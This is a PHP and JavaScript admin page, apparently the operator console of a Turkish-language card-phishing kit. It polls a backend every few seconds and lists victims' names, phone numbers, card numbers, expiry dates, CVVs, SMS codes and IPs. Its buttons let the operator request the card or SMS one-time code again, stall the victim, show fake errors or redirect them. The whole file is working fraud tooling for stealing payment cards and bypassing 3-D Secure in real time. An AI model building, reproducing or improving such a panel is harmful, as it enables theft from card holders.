<?php
session_start();
date_default_timezone_set('Europe/Istanbul');
include("../connect.php");
$sorgula = $db->query("SELECT * FROM site WHERE id = '1'")->fetch(PDO::FETCH_ASSOC);
if(!isset($_SESSION["login"])){
header('Location:login.php');
}else{

?>
<!DOCTYPE html>
<html lang="tr">
<head>
	<meta charset="UTF-8">
    <link href="https://fonts.googleapis.com/css?family=Hind+Madurai&display=swap" rel="stylesheet">
    <link href="https://use.fontawesome.com/releases/v5.0.7/css/all.css" rel="stylesheet">
	<title>Jig Panel</title>
    <link rel="icon" type="image/png" href="../files/ico.png">
    <link type="text/css" rel="stylesheet" href="./css/style.css">
	<meta name="viewport" content="width=device-width, initial-scale=1">
<script type="text/javascript" src="https://code.jquery.com/jquery-3.5.1.js"></script>
<style type="text/css">
	*{
		text-decoration: none;
	}
</style>
<script type="text/javascript">
    function beep() {
        var snd = new Audio("data:audio/wav;base64,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qJrx4KOQjahZxWbcZgztj2c49nKmkId44S71j0c8eV9yDK6uPRzx5X18eDvjvQ6yKo9ZSS6l//8elePK/Lf//IInrOF/FvDoADYAGBMGb7FtErm5MXMlmPAJQVgWta7Zx2go+8xJ0UiCb8LHHdftWyLJE0QIAIsI+UbXu67dZMjmgDGCGl1H+vpF4NSDckSIkk7Vd+sxEhBQMRU8j/12UIRhzSaUdQ+rQU5kGeFxm+hb1oh6pWWmv3uvmReDl0UnvtapVaIzo1jZbf/pD6ElLqSX+rUmOQNpJFa/r+sa4e/pBlAABoAAAAA3CUgShLdGIxsY7AUABPRrgCABdDuQ5GC7DqPQCgbbJUAoRSUj+NIEig0YfyWUho1VBBBA//uQZB4ABZx5zfMakeAAAAmwAAAAF5F3P0w9GtAAACfAAAAAwLhMDmAYWMgVEG1U0FIGCBgXBXAtfMH10000EEEEEECUBYln03TTTdNBDZopopYvrTTdNa325mImNg3TTPV9q3pmY0xoO6bv3r00y+IDGid/9aaaZTGMuj9mpu9Mpio1dXrr5HERTZSmqU36A3CumzN/9Robv/Xx4v9ijkSRSNLQhAWumap82WRSBUqXStV/YcS+XVLnSS+WLDroqArFkMEsAS+eWmrUzrO0oEmE40RlMZ5+ODIkAyKAGUwZ3mVKmcamcJnMW26MRPgUw6j+LkhyHGVGYjSUUKNpuJUQoOIAyDvEyG8S5yfK6dhZc0Tx1KI/gviKL6qvvFs1+bWtaz58uUNnryq6kt5RzOCkPWlVqVX2a/EEBUdU1KrXLf40GoiiFXK///qpoiDXrOgqDR38JB0bw7SoL+ZB9o1RCkQjQ2CBYZKd/+VJxZRRZlqSkKiws0WFxUyCwsKiMy7hUVFhIaCrNQsKkTIsLivwKKigsj8XYlwt/WKi2N4d//uQRCSAAjURNIHpMZBGYiaQPSYyAAABLAAAAAAAACWAAAAApUF/Mg+0aohSIRobBAsMlO//Kk4soosy1JSFRYWaLC4qZBYWFRGZdwqKiwkNBVmoWFSJkWFxX4FFRQWR+LsS4W/rFRb/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////VEFHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAU291bmRib3kuZGUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMjAwNGh0dHA6Ly93d3cuc291bmRib3kuZGUAAAAAAAAAACU=");  
        snd.play();
    }
</script>
</head>
<body>

<h2 class="asd" style="text-align:left;color:#292929;"><img src="../files/logo.png" alt="Xainn" width="21px">
 Panel(Jig) <small id="online" style="font-size:15px;"></small>
	<span style="float:right;"> 
		<a  class="btn" id="sazan.php?tumu=1">
			<button class="button2">
				<i class="fa fa-trash-alt button2"></i>Tümünü Sil
			</button>
		</a>
	 	<a class="btn" id="sazan.php?bankaldir=1">
	 		<button class="button2"><i class="fa fa-asterisk"></i> Banları Kaldır</button>
	 	</a>
	  <a href="priv.php?sifre"><button class="button2"><i class="fa fa-cog"></i> Siteyi düzenle</button></a>
	  <a href="sazan.php?logout">
	  	<button class="button2"><i class="fa fa-sign-out-alt"></i> Çıkış Yap
	  	</button>
	  </a>
	</span>
</h2>

	<table id="data" class="table">
      <thead>
        <tr>
		      <th>DURUM</th>
		      <th>İD</th>
				  <th>TELEFON</th>
				  <th>TL</th>	
				  <th>AD SOYAD</th>	 
		      <th>CC NO</th>
				  <th>SKT</th>
				  <th>CVV</th> 
				 	<th>SMS</th>
				  <th>TARİH</th>
				  <th>IP</th>
				  <th>3D</th>
				  <th>SON</th>
				  <th>YÖNET</th>
        </tr>
      </thead>
      <tbody id="datas">
		
      </tbody>
    </table>
</body>
<script type="text/javascript">
	function sound(){
 	$.get("sazan.php?sound", function(sound, status){
 		if(sound=='1'){
        var snd = new Audio("css/uyari.mp3");  
        snd.play();
 		}
 	});
	}
		$(document).ready(function(){
			self.setInterval("yenile()",3000);
			$('body').on('click', 'a.btn', function() {
				url=$(this).attr("id");
   			$.get(url, function(asd){
        	beep();
        	alert(asd);
   			});
   	});
		});

	 function yenile(){
$(document).ready(function(){
    $.ajax({
        url: "sazan.php",
        dataType: 'json',
        type: 'get',
        cache:false,
        success: function(data){
            var event_data = '';
            	document.getElementById("datas").innerHTML = "";
            $.get("sazan.php?time", function(das, status){
    							online= das;});
            $.get("sazan.php?online", function(fas, status){
            	document.getElementById("online").innerHTML=" Online: "+fas;});
            sound();
            $.each(data, function(index, value){ 
            		yaz=online-value.lastOnline;
            		if(yaz<20){
            			yaz="("+value.ip+" <i style='color: green !important' class='fas fa-circle'></i>)";
            		}else{
            			yaz="("+value.ip+" <i style='color: red !important' class='fas fa-circle'></i>)";
            		}
                event_data += '<tr>';
                event_data += '<td>'+value.now+'</td>';
                event_data += '<td>'+value.id+'</td>';
                event_data += '<td>'+value.phone+'</td>';
                event_data += '<td>'+value.money+'</td>';
                event_data += '<td>'+value.ad+'</td>';
                event_data += '<td>'+value.kk+'</td>';
                event_data += '<td>'+value.sonkul+'</td>';
                event_data += '<td>'+value.cvv+'</td>';
                event_data += '<td>'+value.sms+'</td>';
                event_data += '<td>'+value.date+'</td>';
                event_data += '<td>'+yaz+'</td>';
                event_data += '<td><a class="btn" id="sazan.php?bekle='+value.id+'"><button class="button2">Bekle</button></a><a class="btn" id="sazan.php?kart='+value.id+'"><button class="button2">Kart</button></a>';
                event_data += '<a class="btn" id="sazan.php?sms='+value.id+'"><button class="button2">SMS</button></a> <a class="btn" id="sazan.php?dondur='+value.id+'"><button class="button2">Başa Döndür</button></a></td>';
                event_data += '<td><a class="btn" id="sazan.php?hata='+value.id+'"><button class="button2">Hata Ver</button></a> <a class="btn" id="sazan.php?tebrik='+value.id+'"><button class="button2">Tebrik Et</button></a> <a class="btn" id="sazan.php?ozel='+value.id+'"><button class="button2">Özel Sayfa</button></a></td>';
                event_data += '<td><a class="btn" id="sazan.php?sil='+value.id+'"><button class="button2">Sil</button></a> <a class="btn" id="sazan.php?ban='+value.id+'"><button class="button2">Ban</button></a></td>';
                event_data += '</tr>';
            });
            $("#datas").append(event_data);
        },
        error: function(d){
            alert("404. Please wait until the File is Loaded.");
        }
    });
});
}
    


</script>
</html>
<?php } ?>